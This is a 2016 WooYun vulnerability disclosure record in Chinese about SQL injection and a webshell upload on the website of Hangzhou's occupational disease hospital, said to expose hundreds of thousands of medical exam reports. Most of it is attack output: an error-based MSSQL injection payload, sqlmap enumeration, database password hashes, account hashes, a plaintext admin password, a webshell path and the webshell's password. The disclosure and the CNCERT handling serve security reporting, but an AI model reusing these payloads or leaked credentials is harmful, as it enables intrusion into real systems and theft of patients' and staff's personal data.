{"id": 87694, "wybug_id": "wooyun-2016-0200534", "wybug_title": "杭州市职业病防治院某处漏洞(Getshell)涉及几十万份详细体检报告                                      ", "wybug_corp": "杭州市职业病防治院", "wybug_author": "路人甲", "wybug_date": "2016-04-26 11:40", "wybug_open_date": "2016-06-12 18:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["后台被猜解", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向公众公开  简要描述： 如题、、、 详细说明：  杭州市职业病防治院某处漏洞(getshell)泄露几十万份详细体检报告..杭州市职业病防治院某处SQL注入漏洞，发现是SA 权限  跑出大量敏感数据，登录网站后台   直接任意文件上传getshell  、、、、泄露几十万份详细的体检报告以及该防治院医生信息。。。。注入点：http://**.**.**.**/search/?key=后台：http://**.**.**.**/admin      admin   qwertyuiop4824shell：http://**.**.**.**/data/files/20160425151351.aspx    F4ck\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: key    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: key=%' AND 7049=CONVERT(INT,(CHAR(58) CHAR(120) CHAR(118) CHAR(114) CHAR(58) (SELECT (CASE WHEN (7049=7049) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(105) CHAR(108) CHAR(108) CHAR(58))) AND '%'='---[10:31:09] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008available databases [8]:[*] fzy[*] hzpcc[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdbcurrent database:    'fzy'current user:    'sa'database management system users password hashes:[*] ##MS_PolicyEventProcessingLogin## [1]:    password hash: 0x01003869d680adf63db291c6737f1efb8e4a481b02284215913f        header: 0x0100        salt: 3869d680        mixedcase: adf63db291c6737f1efb8e4a481b02284215913f[*] ##MS_PolicyTsqlExecutionLogin## [1]:    password hash: 0x01008d22a249df5ef3b79ed321563a1dccdc9cfc5ff954dd2d0f        header: 0x0100        salt: 8d22a249        mixedcase: df5ef3b79ed321563a1dccdc9cfc5ff954dd2d0f[*] sa [1]:    password hash: 0x010056049b0ef1e0c5755578b528f857fd1b3a895054a5611f69        header: 0x0100        salt: 56049b0e        mixedcase: f1e0c5755578b528f857fd1b3a895054a5611f69Database: fzy[24 tables]+--------------------+| TN_ACCOUNT         || TN_ARTICLE         || TN_ARTICLE_CATALOG || TN_BOX_RECV        || TN_BOX_SEND        || TN_CGJ_BG          || TN_CGJ_DJ          || TN_COLUMN          || TN_DEPT            || TN_ENUM            || TN_GROUP           || TN_LINK            || TN_LINK_CATALOG    || TN_LY              || TN_MODULE_USER     || TN_MSG             || TN_PARAM           || TN_RECRUITMENT     || TN_TG              || TN_USER            || TN_WZ              || TN_XF              || TN_ZB              || TN_ZB_TYPE         |+--------------------+\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   漏洞证明：  \nDatabase: fzyTable: TN_USER[18 columns]+----------------+----------+| Column         | Type     |+----------------+----------+| dept_id        | varchar  || idcard         | varchar  || isdelete       | int      || isleader       | int      || sex            | int      || user_birthday  | datetime || user_email     | varchar  || user_id        | varchar  || user_job       | varchar  || user_login     | varchar  || user_mobile    | varchar  || user_name      | varchar  || user_no        | varchar  || user_office    | varchar  || user_phone     | varchar  || user_pic       | varchar  || user_pwd       | varchar  || user_virtualno | varchar  |+----------------+----------+Database: fzyTable: TN_ACCOUNT[4 entries]+-----------------------------------------+------------+| user_pwd                                | user_login |+-----------------------------------------+------------+| 540bd55a2cf295b8ea9cd78650e89d03 (0019) | 0019       || 5e90ae5f6eb12b3f3e3c86c0409de103 (0207) | 0207       || a47fa956d8c823d9e8a47d0cbffc20b5        | admin      |qwertyuiop4824| fc1198178c3594bfdda3ca2996eb65cb        | 0010       |+-----------------------------------------+------------+\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  过滤吧。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2016-04-28 17:54 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给浙江分中心，由浙江分中心后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}